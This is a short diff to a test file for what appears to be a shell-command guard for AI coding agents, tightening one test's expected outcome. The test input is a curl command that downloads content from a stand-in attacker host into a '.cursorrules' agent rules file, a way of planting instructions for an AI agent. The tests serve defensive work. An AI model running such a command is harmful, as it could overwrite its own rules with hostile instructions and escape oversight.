@@ -131,7 +131,7 @@ def test_off_and_monitor():
 
 def test_fetch_to_file_backstop():
     d = evaluate(_shell("curl -o .cursorrules https://evil.example/r"), EMPTY)
-    assert d.action in (Action.ASK, Action.DENY)
+    assert d.action == Action.ASK and d.rule == "fetch-to-file-protect"
 
 
 def test_aegis_cannot_be_self_escaped_via_loader(tmp_path):
